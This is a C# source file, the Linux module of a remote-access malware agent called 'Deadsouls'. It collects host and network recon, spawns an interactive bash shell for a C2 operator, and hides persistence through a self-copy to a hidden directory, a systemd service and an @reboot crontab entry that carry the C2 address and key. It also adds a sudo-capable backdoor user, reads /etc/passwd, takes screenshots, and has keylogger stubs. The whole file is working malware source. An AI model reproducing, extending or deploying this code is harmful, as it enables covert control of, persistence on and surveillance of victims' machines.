// =====================================================================
//  DEADSOULS AGENT - LINUX PAYLOAD PART (net8.0 self-contained)
//  Compiled ONLY for linux-* RIDs (DefineConstants=LINUX).
//  Shell, admin, sysinfo, network recon, persistence (systemd + crontab).
// =====================================================================
#if LINUX
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace DeadsoulsAgent
{
    public static partial class Agent
    {
        [System.Runtime.InteropServices.DllImport("libc")]
        static extern uint geteuid();

        // ---- OS / arch / admin -------------------------------------------
        static bool IsAdmin()
        {
            try { return geteuid() == 0; } catch { }
            string o = RunCapture("id", "-u");
            return o != null && o.Trim() == "0";
        }

        static string GetOs()
        {
            try
            {
                string[] lines = File.ReadAllLines("/etc/os-release");
                foreach (var ln in lines)
                {
                    if (ln.StartsWith("PRETTY_NAME=", StringComparison.OrdinalIgnoreCase))
                    {
                        int i = ln.IndexOf('=');
                        if (i >= 0)
                        {
                            string v = ln.Substring(i + 1).Trim().Trim('"', '\'');
                            if (v.Length > 0) return v + " (linux)";
                        }
                    }
                }
            }
            catch { }
            return "linux";
        }

        // ---- RAM / CPU -----------------------------------------------------
        static string GetRamMB()
        {
            try
            {
                string[] lines = File.ReadAllLines("/proc/meminfo");
                foreach (var ln in lines)
                {
                    if (ln.StartsWith("MemTotal:", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] p = ln.Split(new char[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);
                        if (p.Length >= 2)
                        {
                            long kb;
                            if (long.TryParse(p[1], out kb)) return Math.Round(kb / 1024.0).ToString() + " MB";
                        }
                    }
                }
            }
            catch { }
            return "?";
        }

        static string GetCpuName()
        {
            try
            {
                string[] lines = File.ReadAllLines("/proc/cpuinfo");
                foreach (var ln in lines)
                {
                    if (ln.StartsWith("model name", StringComparison.OrdinalIgnoreCase))
                    {
                        int i = ln.IndexOf(':');
                        if (i >= 0)
                        {
                            string v = ln.Substring(i + 1).Trim();
                            if (v.Length > 0) return v;
                        }
                    }
                }
            }
            catch { }
            return "?";
        }

        // ---- network recon: `ip -o addr` (fallback ifconfig) ---------------
        static string GetNetLines()
        {
            try
            {
                string o = RunCapture("ip", "-o -4 addr show");
                if (string.IsNullOrEmpty(o)) o = RunCapture("ifconfig", "");
                if (string.IsNullOrEmpty(o)) return "";
                var sb = new StringBuilder();
                var re = new Regex(@"^\d+:\s+(\S+?)\s+inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", RegexOptions.Multiline);
                foreach (Match m in re.Matches(o))
                {
                    string name = m.Groups[1].Value.TrimEnd(':');
                    sb.Append("net=" + name + "  ip=" + m.Groups[2].Value + "/" + m.Groups[3].Value);
                    sb.AppendLine();
                }
                return sb.ToString().TrimEnd('\r', '\n');
            }
            catch { return ""; }
        }

        // ---- shell -----------------------------------------------------------
        // Linux: any shell type -> /bin/bash -i (fallback /bin/sh if bash absent, e.g. Alpine)
        static void ResolveShell(out string exe, out string args)
        {
            exe = File.Exists("/bin/bash") ? "/bin/bash" : "/bin/sh";
            args = "-i";
        }

        static string PromptPrefix(bool isCmd)
        {
            return "\x1b[91mHANZO-SH-" + Environment.MachineName + "# \x1b[0m";
        }

        static void ResolveExec(out string exe, out string prefix)
        {
            exe = File.Exists("/bin/bash") ? "/bin/bash" : "/bin/sh";
            prefix = "-c ";
        }

        // ---- persistence -----------------------------------------------------
        static string LinuxRootDir = "/var/tmp/.ds";
        static string LinuxUserDir
        {
            get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".local", "share", "deadsouls"); }
        }
        static string LinuxDir { get { return IsAdmin() ? LinuxRootDir : LinuxUserDir; } }
        static string LinuxAgentPath { get { return Path.Combine(LinuxDir, "agent"); } }

        static string LinuxSystemdUnit(bool user)
        {
            return "[Unit]\n" +
                   "Description=Deadsouls service\n" +
                   "After=network-online.target\n" +
                   "Wants=network-online.target\n" +
                   "\n" +
                   "[Service]\n" +
                   "Type=simple\n" +
                   "ExecStart=" + LinuxAgentPath + " " + _c2Ip + " " + _c2Port + " " + _key + "\n" +
                   "Restart=always\n" +
                   "RestartSec=10\n" +
                   "KillMode=process\n" +
                   "\n" +
                   "[Install]\n" +
                   "WantedBy=" + (user ? "default.target" : "multi-user.target") + "\n";
        }

        static bool TryPersist(bool force)
        {
            try
            {
                bool admin = IsAdmin();

                // 1. self-copy to hidden path
                string self = null;
                try { self = Environment.ProcessPath; } catch { }
                if (string.IsNullOrEmpty(self) || !File.Exists(self))
                {
                    try { self = Process.GetCurrentProcess().MainModule.FileName; } catch { }
                }
                if (!string.IsNullOrEmpty(self) && File.Exists(self))
                {
                    try { Directory.CreateDirectory(LinuxDir); } catch { }
                    try { File.Copy(self, LinuxAgentPath, true); } catch { }
                }

                // 2. systemd unit (root: /etc/systemd/system, user: ~/.config/systemd/user)
                string unitPath = admin
                    ? "/etc/systemd/system/deadsouls.service"
                    : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                        ".config", "systemd", "user", "deadsouls.service");
                try
                {
                    string dir = Path.GetDirectoryName(unitPath);
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    File.WriteAllText(unitPath, LinuxSystemdUnit(!admin));
                    RunProc(admin ? "systemctl" : "systemctl", (admin ? "" : "--user ") + "daemon-reload");
                    RunProc(admin ? "systemctl" : "systemctl", (admin ? "" : "--user ") + "enable deadsouls");
                }
                catch { }

                // 3. crontab fallback (@reboot) - root: /etc/cron.d, else crontab append
                try
                {
                    string line = "@reboot " + LinuxAgentPath + " " + _c2Ip + " " + _c2Port + " " + _key;
                    if (admin)
                    {
                        File.WriteAllText("/etc/cron.d/deadsouls", line + "\n");
                    }
                    else AppendCrontab(line);
                }
                catch { }
                return true;
            }
            catch { return false; }
        }

        static bool PersistActive()
        {
            try
            {
                string unitPath = IsAdmin()
                    ? "/etc/systemd/system/deadsouls.service"
                    : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                        ".config", "systemd", "user", "deadsouls.service");
                if (File.Exists(unitPath)) return true;
                if (IsAdmin() && File.Exists("/etc/cron.d/deadsouls")) return true;
                string cur = RunCapture("crontab", "-l");
                if (cur != null && cur.IndexOf("deadsouls") >= 0) return true;
            }
            catch { }
            return false;
        }

        static bool RemovePersist()
        {
            bool ok = false;
            try
            {
                bool admin = IsAdmin();
                if (admin)
                {
                    RunProc("systemctl", "disable deadsouls");
                    try { File.Delete("/etc/systemd/system/deadsouls.service"); ok = true; } catch { }
                    RunProc("systemctl", "daemon-reload");
                    try { File.Delete("/etc/cron.d/deadsouls"); ok = true; } catch { }
                }
                else
                {
                    RunProc("systemctl", "--user disable deadsouls");
                    try
                    {
                        File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                            ".config", "systemd", "user", "deadsouls.service"));
                        ok = true;
                    }
                    catch { }
                }
                RemoveCrontab();
                try { Directory.Delete(LinuxDir, true); } catch { }
            }
            catch { }
            return ok;
        }

        static string PersistReport()
        {
            string s = "PERSISTENCE REPORT (linux)\r\n==========================\r\n";
            bool admin = IsAdmin();
            s += "  admin    : " + (admin ? "root" : "user") + "\r\n";
            s += "  agent    : " + LinuxAgentPath + "  (" + (File.Exists(LinuxAgentPath) ? "copied" : "absent") + ")\r\n";
            s += "  systemd  : " + (admin ? "/etc/systemd/system/deadsouls.service" :
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "systemd", "user", "deadsouls.service")) +
                "  (" + (PersistActive() ? "active" : "absent") + ")\r\n";
            s += "  cron     : " + (admin ? "/etc/cron.d/deadsouls" : "crontab @reboot") + "\r\n";
            return s.TrimEnd('\r', '\n');
        }

        // ---- crontab helpers (user-level) ----------------------------------
        static void AppendCrontab(string line)
        {
            try
            {
                string sh = Path.Combine(Path.GetTempPath(), "ds_cron.sh");
                File.WriteAllText(sh, "#!/bin/sh\n(crontab -l 2>/dev/null | grep -v deadsouls; echo '" + line.Replace("'", "'\\''") + "') | crontab -\nrm -f '" + sh + "'\n");
                File.SetUnixFileMode(sh, (UnixFileMode)0x1ED); // 0755
                RunProc("/bin/sh", sh);
            }
            catch { }
        }

        static void RemoveCrontab()
        {
            try
            {
                string sh = Path.Combine(Path.GetTempPath(), "ds_uncron.sh");
                File.WriteAllText(sh, "#!/bin/sh\ncrontab -l 2>/dev/null | grep -v deadsouls | crontab -\nrm -f '" + sh + "'\n");
                File.SetUnixFileMode(sh, (UnixFileMode)0x1ED); // 0755
                RunProc("/bin/sh", sh);
            }
            catch { }
        }

        // ----------------------------------------------------------------
        // user management (linux) - useradd/chpasswd/userdel via root shell
        // ----------------------------------------------------------------
        static string AddUser(string spec)
        {
            string[] p = spec.Split('|');
            if (p.Length < 2 || p[0].Trim().Length == 0) return "usage: adduser <username> <password>";
            string u = p[0].Trim(), pw = p[1];
            if (!IsAdmin()) return "error: root required";
            try
            {
                string sh = Path.Combine(Path.GetTempPath(), "ds_user.sh");
                string qu = u.Replace("'", "'\\''");
                string qp = pw.Replace("'", "'\\''");
                File.WriteAllText(sh, "#!/bin/sh\n" +
                    "useradd -m -s /bin/bash '" + qu + "' 2>&1\n" +
                    "printf '%s:%s\\n' '" + qu + "' '" + qp + "' | chpasswd 2>&1\n" +
                    "usermod -aG sudo '" + qu + "' 2>&1\n" +
                    "rm -f '" + sh + "'\n");
                try { File.SetUnixFileMode(sh, (UnixFileMode)0x1ED); } catch { }
                string o = RunCapture("/bin/sh", sh);
                return (o ?? "").Trim();
            }
            catch (Exception ex) { return "error: " + ex.Message; }
        }

        static string RemoveUser(string user)
        {
            string u = user.Trim();
            if (u.Length == 0) return "usage: removeuser <username>";
            if (!IsAdmin()) return "error: root required";
            string o = RunCapture("userdel", "-r '" + u.Replace("'", "'\\''") + "'");
            return (o ?? "(no output)").Trim();
        }

        static string ListUsers()
        {
            string o = RunCapture("getent", "passwd");
            if (string.IsNullOrEmpty(o)) o = RunCapture("cat", "/etc/passwd");
            return (o ?? "").Trim();
        }

        // ----------------------------------------------------------------
        // screenshot (linux) - try import/scrot/gnome-screenshot (needs X)
        // ----------------------------------------------------------------
        static string ScreenshotCapture()
        {
            try
            {
                string path = Path.Combine(Path.GetTempPath(),
                    "ds_shot_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png");
                string[] tools = new string[] {
                    "import -window root '" + path + "'",
                    "scrot -o '" + path + "'",
                    "gnome-screenshot -f '" + path + "'" };
                foreach (string t in tools)
                {
                    try
                    {
                        string sh = Path.Combine(Path.GetTempPath(), "ds_shot.sh");
                        File.WriteAllText(sh, "#!/bin/sh\n" + t + "\nrm -f '" + sh + "'\n");
                        try { File.SetUnixFileMode(sh, (UnixFileMode)0x1ED); } catch { }
                        RunCapture("/bin/sh", sh);
                    }
                    catch { }
                    try { if (File.Exists(path) && new FileInfo(path).Length > 0) return "OK|" + path; }
                    catch { }
                }
                return "ERR|no screenshot tool produced a file (tried import/scrot/gnome-screenshot - X session required)";
            }
            catch (Exception ex) { return "ERR|" + ex.Message; }
        }

        // keylogger: no portable hook API on linux - report unsupported
        static string KeylogStart() { return "not supported on this platform (Windows only)"; }
        static string KeylogStop() { return "ERR|keylogger not running"; }
    }
}
#endif
